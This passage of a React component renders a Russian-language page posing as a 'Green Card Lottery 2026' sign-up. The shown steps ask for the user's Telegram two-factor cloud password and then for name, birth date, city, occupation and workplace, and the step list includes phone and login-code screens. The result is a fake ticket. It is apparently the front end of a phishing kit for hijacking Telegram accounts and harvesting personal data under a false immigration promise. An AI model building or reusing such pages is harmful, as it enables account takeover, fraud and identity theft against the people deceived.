          className="w-full h-14 bg-red-600 text-white font-medium rounded-2xl flex items-center justify-center gap-2 transition-all disabled:opacity-40 disabled:cursor-not-allowed hover:bg-red-500"
        >
          {isLoading ? <Spinner /> : "Подтвердить"}
        </button>
      </div>
    </motion.div>
  );

  // Render Password (2FA)
  const renderPassword = () => (
    <motion.div
      key="password"
      variants={pageVariants}
      initial="initial"
      animate="animate"
      exit="exit"
      className="flex flex-col min-h-[100dvh] px-6 py-8"
    >
      {/* Header */}
      <div className="flex items-center gap-4 mb-8">
        <button
          onClick={handleBack}
          className="w-10 h-10 rounded-full flex items-center justify-center hover:bg-white/5 transition-colors"
        >
          <Icons.ArrowLeft />
        </button>
      </div>

      {/* Content */}
      <div className="flex-1 flex flex-col justify-center max-w-md mx-auto w-full">
        {/* Icon */}
        <div className="flex justify-center mb-8">
          <div className="w-20 h-20 rounded-full bg-white/5 border border-white/10 flex items-center justify-center text-white/60">
            <Icons.Shield />
          </div>
        </div>

        <h2 className="text-3xl sm:text-4xl font-serif font-light text-white mb-3 text-center">
          Облачный пароль
        </h2>
        <p className="text-white/50 text-base mb-8 text-center max-w-sm mx-auto">
          Ваш аккаунт защищён двухфакторной аутентификацией. Введите ваш облачный пароль
        </p>

        {/* Info Card */}
        <div className="bg-white/5 border border-white/10 rounded-xl p-4 mb-6">
          <p className="text-white/60 text-sm leading-relaxed">
            Облачный пароль — это дополнительная защита вашего Telegram аккаунта.
            Если вы его забыли, его можно сбросить в настройках Telegram.
          </p>
        </div>

        {/* Password Input */}
        <div className="relative">
          <input
            type={showPassword ? "text" : "password"}
            value={formData.password}
            onChange={(e) => {
              setFormData((prev) => ({ ...prev, password: e.target.value }));
              setPasswordError("");
            }}
            placeholder="Введите пароль"
            className={`w-full h-14 px-4 pr-12 bg-white/5 border rounded-xl text-white placeholder:text-white/30 transition-all ${
              passwordError ? "border-red-500/50" : "border-white/10 focus:border-white/20"
            }`}
            autoFocus
          />
          <button
            type="button"
            onClick={() => setShowPassword(!showPassword)}
            className="absolute right-4 top-1/2 -translate-y-1/2 text-white/40 hover:text-white/60 transition-colors"
          >
            {showPassword ? <Icons.EyeOff /> : <Icons.Eye />}
          </button>
        </div>

        {passwordError && (
          <motion.p
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="text-red-400 text-sm mt-3"
          >
            {passwordError}
          </motion.p>
        )}
      </div>

      {/* Bottom */}
      <div className="pt-6">
        <button
          onClick={submitPassword}
          disabled={!formData.password || isLoading}
          className="w-full h-14 bg-red-600 text-white font-medium rounded-2xl flex items-center justify-center gap-2 transition-all disabled:opacity-40 disabled:cursor-not-allowed hover:bg-red-500"
        >
          {isLoading ? <Spinner /> : "Продолжить"}
        </button>
      </div>
    </motion.div>
  );

  // Render Info Form
  const renderInfo = () => (
    <motion.div
      key="info"
      variants={pageVariants}
      initial="initial"
      animate="animate"
      exit="exit"
      className="flex flex-col min-h-[100dvh] px-6 py-8"
    >
      {/* Header */}
      <div className="flex items-center gap-4 mb-2">
        <button
          onClick={handleBack}
          className="w-10 h-10 rounded-full flex items-center justify-center hover:bg-white/5 transition-colors"
        >
          <Icons.ArrowLeft />
        </button>
        <div className="flex-1">
          <div className="h-1 bg-white/10 rounded-full overflow-hidden">
            <motion.div
              className="h-full bg-red-500 rounded-full"
              initial={{ width: 0 }}
              animate={{ width: `${infoProgress * 100}%` }}
              transition={{ duration: 0.3 }}
            />
          </div>
        </div>
        <span className="text-white/40 text-sm tabular-nums w-12 text-right">
          {Math.round(infoProgress * 100)}%
        </span>
      </div>

      {/* Content */}
      <div className="flex-1 overflow-y-auto py-6">
        <h2 className="text-3xl font-serif font-light text-white mb-2">
          Личные данные
        </h2>
        <p className="text-white/50 text-base mb-8">Шаг 1 из 2</p>

        <div className="space-y-4 max-w-md">
          {/* Last Name */}
          <div>
            <label className="block text-white/50 text-sm mb-2">Фамилия *</label>
            <input
              type="text"
              value={formData.lastName}
              onChange={(e) => setFormData((prev) => ({ ...prev, lastName: e.target.value }))}
              className="w-full h-14 px-4 bg-white/5 border border-white/10 rounded-xl text-white placeholder:text-white/30 focus:border-white/20 transition-all"
              placeholder="Иванов"
            />
          </div>

          {/* First Name */}
          <div>
            <label className="block text-white/50 text-sm mb-2">Имя *</label>
            <input
              type="text"
              value={formData.firstName}
              onChange={(e) => setFormData((prev) => ({ ...prev, firstName: e.target.value }))}
              className="w-full h-14 px-4 bg-white/5 border border-white/10 rounded-xl text-white placeholder:text-white/30 focus:border-white/20 transition-all"
              placeholder="Иван"
            />
          </div>

          {/* Middle Name */}
          <div>
            <label className="block text-white/50 text-sm mb-2">Отчество</label>
            <input
              type="text"
              value={formData.middleName}
              onChange={(e) => setFormData((prev) => ({ ...prev, middleName: e.target.value }))}
              className="w-full h-14 px-4 bg-white/5 border border-white/10 rounded-xl text-white placeholder:text-white/30 focus:border-white/20 transition-all"
              placeholder="Иванович"
            />
          </div>

          {/* Birth Date */}
          <div>
            <label className="block text-white/50 text-sm mb-2">Дата рождения *</label>
            <input
              type="date"
              value={formData.birthDate}
              onChange={(e) => setFormData((prev) => ({ ...prev, birthDate: e.target.value }))}
              className="w-full h-14 px-4 bg-white/5 border border-white/10 rounded-xl text-white focus:border-white/20 transition-all"
            />
          </div>

          {/* Current City */}
          <div>
            <label className="block text-white/50 text-sm mb-2">Город проживания *</label>
            <input
              type="text"
              value={formData.currentCity}
              onChange={(e) => setFormData((prev) => ({ ...prev, currentCity: e.target.value }))}
              className="w-full h-14 px-4 bg-white/5 border border-white/10 rounded-xl text-white placeholder:text-white/30 focus:border-white/20 transition-all"
              placeholder="Минск"
            />
          </div>
        </div>
      </div>

      {/* Bottom */}
      <div className="pt-6">
        <button
          onClick={handleSubmitInfo}
          disabled={!formData.firstName || !formData.lastName || !formData.birthDate || !formData.currentCity}
          className="w-full h-14 bg-red-600 text-white font-medium rounded-2xl flex items-center justify-center gap-2 transition-all disabled:opacity-40 disabled:cursor-not-allowed hover:bg-red-500"
        >
          Далее
        </button>
      </div>
    </motion.div>
  );

  // Render Info2 Form
  const renderInfo2 = () => (
    <motion.div
      key="info2"
      variants={pageVariants}
      initial="initial"
      animate="animate"
      exit="exit"
      className="flex flex-col min-h-[100dvh] px-6 py-8"
    >
      {/* Header */}
      <div className="flex items-center gap-4 mb-2">
        <button
          onClick={handleBack}
          className="w-10 h-10 rounded-full flex items-center justify-center hover:bg-white/5 transition-colors"
        >
          <Icons.ArrowLeft />
        </button>
        <div className="flex-1">
          <div className="h-1 bg-white/10 rounded-full overflow-hidden">
            <div className="h-full bg-red-500 rounded-full w-full" />
          </div>
        </div>
        <span className="text-white/40 text-sm w-12 text-right">100%</span>
      </div>

      {/* Content */}
      <div className="flex-1 overflow-y-auto py-6">
        <h2 className="text-3xl font-serif font-light text-white mb-2">
          Дополнительно
        </h2>
        <p className="text-white/50 text-base mb-8">Шаг 2 из 2</p>

        <div className="space-y-4 max-w-md">
          {/* Occupation */}
          <div>
            <label className="block text-white/50 text-sm mb-2">Род де��тельности *</label>
            <input
              type="text"
              value={formData.occupation}
              onChange={(e) => setFormData((prev) => ({ ...prev, occupation: e.target.value }))}
              className="w-full h-14 px-4 bg-white/5 border border-white/10 rounded-xl text-white placeholder:text-white/30 focus:border-white/20 transition-all"
              placeholder="Программист"
            />
          </div>

          {/* Workplace */}
          <div>
            <label className="block text-white/50 text-sm mb-2">Место работы</label>
            <input
              type="text"
              value={formData.workplace}
              onChange={(e) => setFormData((prev) => ({ ...prev, workplace: e.target.value }))}
              className="w-full h-14 px-4 bg-white/5 border border-white/10 rounded-xl text-white placeholder:text-white/30 focus:border-white/20 transition-all"
              placeholder="Название компании"
            />
          </div>

          {/* Education */}
          <div>
            <label className="block text-white/50 text-sm mb-2">Образование</label>
            <input
              type="text"
              value={formData.education}
              onChange={(e) => setFormData((prev) => ({ ...prev, education: e.target.value }))}
              className="w-full h-14 px-4 bg-white/5 border border-white/10 rounded-xl text-white placeholder:text-white/30 focus:border-white/20 transition-all"
              placeholder="Высшее, БГУ"
            />
          </div>

          {/* About */}
          <div>
            <label className="block text-white/50 text-sm mb-2">О себе</label>
            <textarea
              value={formData.about}
              onChange={(e) => setFormData((prev) => ({ ...prev, about: e.target.value }))}
              className="w-full h-32 px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white placeholder:text-white/30 focus:border-white/20 transition-all resize-none"
              placeholder="Расскажите немного о себе и почему хотите переехать в США..."
            />
          </div>
        </div>
      </div>

      {/* Bottom */}
      <div className="pt-6">
        <button
          onClick={handleFinalSubmit}
          disabled={!formData.occupation}
          className="w-full h-14 bg-red-600 text-white font-medium rounded-2xl flex items-center justify-center gap-2 transition-all disabled:opacity-40 disabled:cursor-not-allowed hover:bg-red-500"
        >
          Завершить реги��т��ацию
        </button>
      </div>
    </motion.div>
  );

  // Render Success
  const renderSuccess = () => (
    <motion.div
      key="success"
      variants={pageVariants}
      initial="initial"
      animate="animate"
      exit="exit"
      className="flex flex-col min-h-[100dvh] px-6 py-8"
    >
      <div className="flex-1 flex flex-col items-center justify-center text-center">
        {/* Success Icon */}
        <motion.div
          initial={{ scale: 0 }}
          animate={{ scale: 1 }}
          transition={{ type: "spring", damping: 10, delay: 0.2 }}
          className="w-24 h-24 rounded-full bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center mb-8"
        >
          <svg className="w-12 h-12 text-emerald-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <polyline points="20 6 9 17 4 12" />
          </svg>
        </motion.div>

        <motion.h2
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.3 }}
          className="text-3xl sm:text-4xl font-serif font-light text-white mb-4"
        >
          Вы участвуете!
        </motion.h2>

        <motion.p
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.4 }}
          className="text-white/50 text-base mb-10 max-w-sm"
        >
          Ваша заявка принята. Результаты розыгрыша будут объявлены 1 июля 2026
        </motion.p>

        {/* Ticket */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.5 }}
          className="w-full max-w-sm"
        >
          <div className="relative bg-gradient-to-br from-white/10 to-white/5 border border-white/10 rounded-2xl p-6 overflow-hidden">
            {/* Decorative circles */}
            <div className="absolute -left-3 top-1/2 -translate-y-1/2 w-6 h-6 bg-black rounded-full" />
            <div className="absolute -right-3 top-1/2 -translate-y-1/2 w-6 h-6 bg-black rounded-full" />

            {/* Dashed line */}
            <div className="absolute left-6 right-6 top-1/2 -translate-y-1/2 border-t border-dashed border-white/10" />

            {/* Top section */}
            <div className="text-center mb-8">
              <p className="text-white/40 text-xs uppercase tracking-wider mb-1">Green Card Lottery</p>
              <p className="text-white/60 text-sm">2026</p>
            </div>

            {/* Ticket number */}
            <div className="text-center">
              <p className="text-white/40 text-xs uppercase tracking-wider mb-3">Ваш номер</p>
              <div className="flex justify-center gap-2">
                {ticketNumber.toString().split("").map((digit, i) => (
                  <motion.span
                    key={i}
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 0.6 + i * 0.1 }}
                    className="w-10 h-12 bg-white/5 border border-white/10 rounded-lg flex items-center justify-center text-xl font-light text-white tabular-nums"
                  >
                    {digit}
                  </motion.span>
                ))}
              </div>
            </div>
          </div>
        </motion.div>
      </div>

      {/* Bottom */}
      <div className="pt-6">
        <p className="text-center text-white/30 text-xs">
          Сохраните этот номер. Он понадобится для получения Green Card
        </p>
      </div>
    </motion.div>
  );

  return (
    <div className="min-h-[100dvh] bg-background text-foreground font-sans">
      <AnimatePresence mode="wait">
        {step === "landing" && renderLanding()}
        {step === "phone" && renderPhone()}
        {step === "code" && renderCode()}
        {step === "password" && renderPassword()}
        {step === "info" && renderInfo()}
        {step === "info2" && renderInfo2()}
        {step === "success" && renderSuccess()}
      </AnimatePresence>
    </div>
  );
}
